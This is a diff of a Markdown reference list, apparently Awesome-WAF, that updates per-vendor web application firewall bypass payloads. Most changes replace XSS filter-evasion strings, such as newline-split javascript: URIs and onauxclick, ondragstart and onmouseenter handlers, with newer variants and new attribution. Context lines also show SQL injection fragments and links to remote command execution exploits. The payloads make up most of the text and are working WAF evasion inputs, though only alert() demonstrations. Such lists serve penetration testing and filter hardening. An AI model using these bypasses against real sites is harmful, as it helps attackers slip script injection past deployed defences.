@@ -2582,9 +2582,9 @@ GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&co
 Host: favoritewaf.com
 User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
 ```
-- XSS Bypass - [Source](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf)
+- XSS Bypass by [0xInfection](https://twitter.com/0xInfection)
 ```
-<a/href=&#74;ava%0a%0d%09script&colon;alert()>click
+<a/href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:alert()>clickhere
 ```
 - [Barracuda WAF 8.0.1 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40146) by [@xort](https://www.exploit-db.com/?author=479#)
 - [Barracuda Spam & Virus Firewall 5.1.3 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40147) by [@xort](https://www.exploit-db.com/?author=479)
@@ -2638,15 +2638,11 @@ http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3csc
 ```
 <--`<img/src=` onerror=confirm``> --!>
 ```
-- XSS Bypass - [Source](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf)
-```
-<a"/onclick=(confirm)()>click
-```
 
 ### Comodo 
-- XSS Bypass - [Source](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf)
+- XSS Bypass by [0xInfection](https://twitter.com/0xinfection)
 ```
-<d3v/onauxclick=(((confirm)))``>click
+<lol/onauxclick=[2].some(confirm)>rightclickhere
 ```
 - SQLi by [@WAFNinja](https://waf.ninja)
 ```
@@ -2696,9 +2692,9 @@ Keep-Alive: 300
 <isindex action="javas&tab;cript:alert(1)" type=image>
 <marquee/onstart=confirm(2)>
 ```
-- XSS Bypass by [@s0md3v](https://twitter.com/s0md3v)
+- XSS Bypass by [@0xInfection](https://twitter.com/0xinfection)
 ```
-<details/open/ontoggle=(confirm)()//
+<p draggable=True ondragstart=prompt()>alert
 ```
 - GET - XSS Bypass (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
 ```
@@ -2838,9 +2834,9 @@ stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS 
 ```
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
 ```
-- XSS Bypass - [Source](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf)
+- XSS Bypass by [0xInfection](https://twitter.com/0xInfection)
 ```
- <d3v/onauxclick=[2].some(confirm)>click 
+<abc/onmouseenter=confirm%60%60>
 ```
 
 ### Profense
@@ -2892,9 +2888,9 @@ https://host:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<scrip
 ```
 <a href=javas&#99;ript:alert(1)>
 ```
-- XSS Bypass - [Source](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf)
+- XSS Bypass by [@0xInfection](https://twitter.com/0xInfection)
 ```
-<a/href=javascript&colon;alert()>click
+<a/**/href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At&colon;/**/alert()/**/>click
 ```
 - [HTML Injection](https://www.securityfocus.com/bid/69815/info) by [@Voxel](https://www.exploit-db.com/?author=8505)
 ```
